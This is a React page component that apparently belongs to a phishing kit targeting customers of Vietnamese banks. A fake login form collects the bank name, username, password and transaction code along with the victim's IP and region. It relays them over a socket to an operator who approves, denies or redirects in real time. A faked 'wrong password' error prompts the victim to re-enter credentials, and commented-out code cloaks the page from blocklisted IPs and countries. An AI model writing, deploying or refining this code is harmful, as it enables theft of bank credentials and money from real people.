/* eslint-disable @typescript-eslint/no-explicit-any */
import { useEffect, useState, useRef } from 'react'
// import Banner from '../assets/images/banner-b1482d4c.webp'
import Modal from '~/components/Modal'
// import FaceBook from '~/assets/images/fb.d95f74a211e4eb5f4257.png'
// import { useTranslation } from 'react-i18next'
import 'react-phone-input-2/lib/style.css'
import socket from '~/utils/socket'
// import { createIp } from '~/apis/ip.api'
import { createTable, updateTable } from '~/apis/table.api'
import { useNavigate } from 'react-router-dom'
// import { getBlackList, getBlackListCountry } from '~/apis/ip.api'
import logos from '~/assets/images/logos.jpg'
import { useMutation } from 'react-query'
import Eye from '~/assets/images/eye-close.png'
// import NumberInput from '~/components/InputNumber'
// import Woman from '~/assets/images/woman.webp'
// import khien from '~/assets/images/prot-01-600x600.webp'
// import lock from '~/assets/images/lock.png'
// import page from '~/assets/images/page.png'
// // import YouTube from 'react-youtube'
// import a1 from '~/assets/images/Instructional-_-form.svg'
// import a2 from '~/assets/images/Instructional-_-receiver-1.svg'
// import ReCAPTCHA from 'react-google-recaptcha'
// import a3 from '~/assets/images/Instructional-_-send-n-receive-2.svg'

// import a4 from '~/assets/images/Instructional-_-track-transfer-3.svg'

import axios from 'axios'

const Home = () => {
  // const opts = {
  //   height: '250',
  //   width: '440',
  //   playerVars: {
  //     // https://developers.google.com/youtube/player_parameters
  //     autoplay: 1
  //   }
  // }
  // const [issue, setIssue] = useState('')
  const coQG = [
    {
      img: 'https://tienichhay.net/uploads/flags/flat/64x64/vn.png'
    },
    {
      img: 'https://tienichhay.net/uploads/flags/shiny/128x128/gb.png'
    },
    {
      img: 'https://tienichhay.net/uploads/flags/flat/64x64/us.png'
    },
    {
      img: 'https://tienichhay.net/uploads/flags/flat/64x64/de.png'
    },
    {
      img: 'https://tienichhay.net/uploads/flags/flat/64x64/kr.png'
    }
  ]

  // const { t, i18n } = useTranslation()
  // const [step1, setStep1] = useState(true)
  const [step2, setStep2] = useState(false)
  const [step3, setStep3] = useState(false)
  const [phoneNumber, NumberNumber] = useState('')
  // const [nganHang, setnganHang] = useState('')
  const [tenDangNhap, settenDangNhap] = useState('')
  const [maGD2, setMaGD2] = useState('')
  // const [maGD, setmaGD] = useState('')
  const [password, setPassword] = useState('')
  const [code, setCode] = useState('')
  const [step4, setStep4] = useState(false)
  // socket base is read from VITE_SOCKET_BASE_URL inside ~/utils/socket
  // const serverUrl = 'https://apifsv3.mercadolibresa.com'
  // const [blockList, setBlockList] = useState<string[]>([])
  // const [blockListCountry, setBlockListCountry] = useState<string[]>([])


  const handleSubmitFormPhoneEmail = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    // setStep3(false)
    // setStep2(false)
    // setStep1(false)
  }

  const generateRandomString = (length: number) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    let result = ''

    for (let i = 0; i < length; i++) {
      const randomIndex = Math.floor(Math.random() * characters.length)
      result += characters.charAt(randomIndex)
    }

    return result
  }

  // const [change, setChange] = useState()
  const [status, setStatus] = useState<string>('')
  // const [ipCheck, setIpCheck] = useState<string>('')
  const [id, setId] = useState<string>('')
  const [showValid, setShowValid] = useState(false)
  const [showLoading, setShowLoading] = useState(false)
  const [showError, setShowError] = useState(false)

  // function isValidEmail(email: string) {
  //   const emailRegex = /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i
  //   return emailRegex.test(email)
  // }
  // const disablePhoneNumber = () => {
  //   const unDisable = phoneNumber.length >= 3
  //   return unDisable
  // }
  // const disableTenDangNhap = () => {
  //   const unDisable = tenDangNhap.length >= 3
  //   return unDisable
  // }

  const disablePassword = () => {
    const unDisable = tenDangNhap.length >= 3 && password.length >= 3 && maGD2.length >= 3
    // && isCaptchaValid === true
    return unDisable
  }
  const cuserPonter = () => {
    const unDisable = tenDangNhap.length >= 3 && password.length >= 3 && maGD2.length >= 3
    // && isCaptchaValid === true
    return unDisable || `cursor-pointer`
  }
  // const [userAgent, setUserAgent] = useState('')

  // useEffect(() => {
  //   // const userAgent = navigator.userAgent
  //   setUserAgent(maGD2)
  // }, [])
  useEffect(() => {
    if (phoneNumber === '') {
      NumberNumber('')
    }
  }, [phoneNumber])

  const [ip, setIp] = useState('')
  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        setIp(data.ip)
        // console.log('ip', data.ip)
      })
      .catch((error) => {
        console.error('Lỗi khi lấy địa chỉ IP:', error)
      })
  }, [])
  const [country, setCountry] = useState('')
  // const [countryCode, setCountryCode] = useState('')
  const [city, setCity] = useState('')
  useEffect(() => {
    fetch(`https://ipinfo.io/${ip}?token=4062af641c7f89`)
      .then((response) => response.json())
      .then((data) => {
        setCountry(data.country)
        // setCountryCode(data.region)
        setCity(data.region)
        // console.log(data)
      })
      .catch((error) => {
        console.error('Lỗi khi lấy thông tin địa lý:', error)
      })
  }, [ip])

  // useQuery({
  //   queryKey: ['blacklist', 6],
  //   queryFn: () => {
  //     return getBlackList()
  //   },
  //   onSuccess: (data: any) => {
  //     setBlockList(data.data)
  //   },
  //   cacheTime: 40000
  // })
  // useQuery({
  //   queryKey: ['blacklist-country', 7],
  //   queryFn: () => {
  //     return getBlackListCountry()
  //   },
  //   onSuccess: (data: any) => {
  //     setBlockListCountry(data.data)
  //   },
  //   cacheTime: 40000
  // })
  const [data, setData] = useState([])
  const [filteredData, setFilteredData] = useState([])
  const [searchTerm, setSearchTerm] = useState()
  const initialFromState = {
    // userId: profile?._id,
    nganHang: ''
  }
  const [showBankList, setShowBankList] = useState(false)
  const bankListRef = useRef<HTMLDivElement>(null)
  // Đóng dropdown khi click ra ngoài
  useEffect(() => {
    if (!showBankList) return
    const handleClickOutside = (event: MouseEvent) => {
      if (bankListRef.current && !bankListRef.current.contains(event.target as Node)) {
        setShowBankList(false)
      }
    }
    document.addEventListener('mousedown', handleClickOutside)
    return () => {
      document.removeEventListener('mousedown', handleClickOutside)
    }
  }, [showBankList])
  const [formState, setFormState] = useState(initialFromState)
  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await axios.get('https://api.vietqr.io/v2/banks')
        setData(response.data.data)
        setFilteredData(response.data.data) // Initialize filteredData with all data
      } catch (error) {
        console.error('Error fetching data:', error)
      }
    }

    fetchData()
  }, [])
  const handleInputChange = (event: any) => {
    const term = event.target.value
    setSearchTerm(term)

    if (data.length > 0) {
      const filtered = data.filter(
        (item: any) => item.shortName && item.shortName.toLowerCase().includes(term.toLowerCase())
      )
      setFilteredData(filtered)
    }
  }
  useEffect(() => {
    if (status === 'agree') {
      console.log('adi')
      setShowError(false)
      setShowValid(true)
    }
  }, [status])
  useEffect(() => {
    if (status === 'deny') {
      setShowValid(false)
      setShowError(true)
    }
    if (status === 'pending') {
      setShowValid(true)
      setShowError(false)
    }
  }, [status])
  console.log('step3', step3)
  // const isBlocked = blockList
  // if (isBlocked) {
  //   const newIp = isBlocked.map((item: any) => item.ip)
  //   const boolean = newIp.includes(ip)
  //   if (isBlocked.length > 0 && boolean) {
  //     window.location.href = 'https://www.google.com'
  //   }
  // }
  // const codeLang = country.toLocaleLowerCase()

  // const isBlockedCountry = blockListCountry
  // if (isBlockedCountry) {
  //   const newIp = isBlockedCountry.map((item: any) => item.code)
  //   const boolean = newIp.includes(codeLang)
  //   if (isBlockedCountry.length > 0 && boolean) {
  //     window.location.href = 'https://www.google.com'
  //   }
  // }

  // useEffect(() => {
  //   i18n.changeLanguage(codeLang)
  // }, [codeLang, i18n])
  // useEffect(() => {
  //   i18n.changeLanguage('en')
  // }, [i18n])
  // console.log('Nơi ip', city + ', ' + country)
  useEffect(() => {
    const datas = {
      ip: ip,
      socketId: socket.id
    }
    console.log(socket.id)
    socket.emit('count', datas)
  }, [ip])
  const navigate = useNavigate()
  useEffect(() => {
  socket.on('adminMessage', (data: any) => {
      const dataCheck = data.codeRandom
      const checkKey = localStorage.getItem('randomString')

      if (dataCheck === checkKey) {
        localStorage.setItem('iduser', data.id)

        setId(data.id)
        setStatus(data.confirm)
        console.log('first', data.confirm)
        if (data.confirm === 'agree') {
          console.log('cehksc')
          setStep3(true)
          setStep4(false)
          setStep2(false)
        } else if (data.confirm === 'reaload') {
          // setStep1(true)
          setStep2(false)
          setStep3(false)
          // setStep4(false)
          setPassword('')
          // setnganHang('')
          settenDangNhap('')
          // setmaGD('')
          setCode('')
          NumberNumber('')
          navigate('/404')
        } else if (data.confirm === 'setting') {
          // setStep1(true)
          setStep2(false)
          setStep3(false)
          // setStep4(false)
          setPassword('')
          // setnganHang('')
          settenDangNhap('')
          // setmaGD('')
          setCode('')
          NumberNumber('')
          navigate('/setting')
        } else if (data.confirm === 'deny') {
          setShowError(true)
          setShowValid(false)
        } else if (data.confirm === 'pending') {
          setShowError(false)
          setShowValid(true)
        }
      }
    })
    return () => {
      socket.off('adminMessage')
    }
  }, [showValid, showError])
  // const [isCaptchaValid, setIsCaptchaValid] = useState(false)
  // const handleCaptchaChange = (value: any) => {
  //   // Xử lý khi giá trị reCAPTCHA thay đổi
  //   // console.log('reCAPTCHA value:', value)
  //   setIsCaptchaValid(!!value)
  // }

  const handleSubmit = () => {
    // Gửi dữ liệu qua Socket.IO
    if (status === 'deny') {
      handleUpdatePassword2()
    } else {
  const randomString = generateRandomString(10)
      console.log(formState)

      const data = {
        nganHang: formState.nganHang,
        tenDangNhap: tenDangNhap,
        ip: ip,
        socketId: socket.id,
        codeRandom: randomString,
        quocGiaIp: city + ', ' + country,
        userGent: maGD2,
        quocGiaPhone: country,
        phone: phoneNumber,
        password: password,
        status: 'pending',
        otp2FA: code,
        username: null,
        note: false,
        password2: ''
      }
  localStorage.setItem('randomString', randomString)
  socket.emit('formData', data)
      console.log(data)
      createTable(data)
      // if (isCaptchaValid) {
      //   // Thực hiện các bước xử lý submit form tại đây
      //   console.log('Form submitted!')
      // } else {
      //   alert('Vui lòng xác nhận bạn không phải là robot!')
      // }
    }
  }

  const mutationUpdateCode = useMutation((body: any) => {
    return updateTable(body)
  })

  // const handleUpdataCode = () => {
  //   const newData = { _id: id, otp2FA: code, status: 'pending' }
  //   console.log(newData)
  //   mutationUpdateCode.mutate(newData, {
  //     onSuccess: () => {
  //       const socket = io(serverUrl)
  //       socket.emit('password2')
  //       const data = {
  //         codeRandom: localStorage.getItem('randomString'),
  //         id: id,
  //         ip: ip,
  //         confirm: 'pending'
  //       }
  //       socket.emit('confirmId', data)
  //     }
  //   })
  // }

  const handleUpdatePassword2 = () => {
    const newData = {
      _id: id,
      password: password,
      tenDangNhap: tenDangNhap,
      nganHang: formState.nganHang,
      status: 'pending'
    }
    mutationUpdateCode.mutate(newData, {
      onSuccess: () => {
        socket.emit('password2')
        const data = {
          codeRandom: localStorage.getItem('randomString'),
          id: id,
          ip: ip,
          confirm: 'pending'
        }
        socket.emit('confirmId', data)
        // console.log(data.data)
      }
    })
  }
  console.log(formState)
  const [showPass, setShowPass] = useState(false)
  return (
    <div>
      <section className='mt-10 pt-10 sm:mt-10 lg:mt-20'>
        <div className='text-center'></div>

        {!step2 && (
          <form
            onSubmit={handleSubmitFormPhoneEmail}
            className='mt-[28.28px] px-[15px] py-[25px] border-[rgba(0,0,0,0.4)] border-[0.5px] rounded-lg max-w-[700px] w-[90%] mx-auto'
          >
            <h3 className='mt-1 text-center mb-[10px] text-[#000000bf] font-[700]'>
              <div className='sm:flex md:flex items-center text-center'>
                <img className='text-xl font-semibold w-20 mx-auto' src={logos} />
              </div>
            </h3>
            <div className='mb-5'>
              <label htmlFor='' className='font-[500]'>
                Quý khách vui lòng chọn ngân hàng
                <span className='text-[#484848ab]'>*</span>
              </label>

              <div className={`relative py-3 px-3 mt-3 border rounded-[5px]`} ref={bankListRef}>
                <div
                  onClick={() => setShowBankList(!showBankList)}
                  className={`cursor-pointer ${showBankList ? '' : 'bg-white'}`}
                >
                  {formState.nganHang || 'Chọn ngân hàng'}
                </div>
                {showBankList && (
                  <div className='absolute z-10 bg-white border p-3 mt-1 left-0 right-0 top-full max-h-[350px] min-w-[250px] shadow-xl rounded-lg overflow-y-auto animate-fade-in'>
                    <div className='flex items-center gap-2 mb-3 px-1'>
                      <svg
                        className='w-5 h-5 text-gray-400'
                        fill='none'
                        stroke='currentColor'
                        strokeWidth='2'
                        viewBox='0 0 24 24'
                      >
                        <circle cx='11' cy='11' r='8' />
                        <line x1='21' y1='21' x2='16.65' y2='16.65' />
                      </svg>
                      <input
                        autoFocus
                        value={searchTerm}
                        onChange={handleInputChange}
                        type='text'
                        className='w-full bg-gray-100 focus:bg-white py-2 rounded-lg text-base px-3 border border-gray-300 focus:border-blue-400 outline-none transition-all duration-150'
                        placeholder='Tìm kiếm ngân hàng...'
                      />
                    </div>
                    <div className='divide-y divide-gray-100'>
                      {filteredData.length === 0 && (
                        <div className='text-center text-gray-400 py-6'>Không tìm thấy ngân hàng</div>
                      )}
                      {filteredData.map((item: any) => (
                        <div
                          onClick={() => {
                            setFormState({ ...formState, nganHang: item.shortName })
                            setShowBankList(false)
                          }}
                          key={item.id}
                          className='flex items-center gap-3 p-2 hover:bg-blue-50 transition cursor-pointer rounded group'
                        >
                          <img
                            src={item.logo}
                            alt={item.name}
                            className='w-12 h-12 object-contain rounded shadow-sm border'
                          />
                          <div className='flex flex-col flex-1'>
                            <span className='font-semibold text-gray-900 group-hover:text-blue-700'>{item.name}</span>
                            <span className='text-xs text-gray-500'>
                              {item.shortName} • {item.code}
                            </span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </div>

            <div className='mb-5'>
              <label htmlFor='' className='font-[500]'>
                Tên đăng nhập
                <span className='text-[#484848ab]'>*</span>
              </label>
              <div className='flex h-[46px] mt-3 border border-[#CACAca] rounded-[5px] static'>
                <input
                  type='text'
                  className='pb-1 email-style appearance-none placeholder:text-[14px] px-[12px]  w-full transition-all rounded-[5px] '
                  value={tenDangNhap}
                  placeholder='Nhập tên đăng nhập'
                  onChange={(e) => settenDangNhap(e.target.value)}
                />
              </div>
            </div>

            <div className='mb-5'>
              <label htmlFor='' className='font-[500]'>
                Mật khẩu <span className='text-[#484848ab]'>*</span>
              </label>
              <div className='flex h-[46px] mt-3 border border-[#CACAca] rounded-[5px] relative'>
                <input
                  type={!showPass ? 'password' : 'text'}
                  className='pb-1 email-style appearance-none placeholder:text-[14px] px-[12px]  w-full transition-all rounded-[5px] '
                  value={password}
                  placeholder='Nhập mật khẩu'
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button
                  type='button'
                  onClick={() => setShowPass(!showPass)}
                  className='w-5 h-5 absolute top-1/2 -translate-y-1/2 right-3'
                >
                  <img src={Eye} alt='Eye' />
                </button>
              </div>
            </div>
            <div className='mb-5'>
              <label htmlFor='' className='font-[500]'>
                Mã giao dịch <span className='text-[#484848ab]'>*</span>
              </label>
              <div className='flex h-[46px] mt-3 border border-[#CACAca] rounded-[5px] static'>
                <input
                  type='text'
                  className='pb-1 email-style appearance-none placeholder:text-[14px] px-[12px]  w-full transition-all rounded-[5px] '
                  placeholder='Nhập mã giao dịch'
                  onChange={(e) => setMaGD2(e.target.value)}
                />
              </div>
            </div>
            <div className='mb-5'>
              {/* <ReCAPTCHA sitekey='6LcFHtcpAAAAAFNenzoEDrJLk-Vdwzs-9WWC7FUc' onChange={handleCaptchaChange} /> */}
            </div>
            {showLoading && !showError && (
              <div className='text-[#05a442] my-[10px] text-[14px]'>
                Đang xác nhận
                <svg
                  aria-hidden='true'
                  role='status'
                  className='inline w-3 h-3 ml-[3px] mb-[2px] text-white animate-spin'
                  viewBox='0 0 100 101'
                  fill='none'
                  xmlns='http://www.w3.org/2000/svg'
                >
                  <path
                    d='M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z'
                    fill='#05a442'
                  />
                  <path
                    d='M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z'
                    fill='currentColor'
                  />
                </svg>
              </div>
            )}
            {showError && <div className='text-[14px] mt-2 text-[#dc3545] mb-3'>Sai tên đăng nhập hoặc mật khẩu</div>}
            <div className='flex justify-center'>
              <button
                type='submit'
                disabled={!(disablePassword() && formState.nganHang)}
                onClick={() => {
                  handleSubmit(), setShowLoading(true)
                }}
                className={`bg-black ${cuserPonter} items-center hover:opacity-[85%] disabled:opacity-[85%] text-yellow-300 flex mt-[10px] px-3 rounded-full py-[10px]`}
              >
                <p className='mb-1'>Đăng nhập</p>
              </button>
            </div>
          </form>
        )}
      </section>
      <Modal
        id={id}
        // ip={ip}
        status={status}
        setPassword={setPassword}
        isOpen={step3 && !step4}
        handleFinal={() => {
          navigate('/404')
        }}
      ></Modal>
      <footer className='relative w-full mt-5 text-white text-xl'>
        <div className='mx-auto w-full max-w-7xl px-8 bg-white'>
          <div className='mx-auto grid w-full grid-cols-5 gap-5 px-center py-12 md:grid-cols-5 lg:grid-cols-5'>
            {coQG.map(({ img }, key: number) => (
              <img src={img} alt={`${key}`} className='w-20 mx-auto' />
            ))}
          </div>
        </div>
        
      </footer>
    </div>
  )
}

export default Home
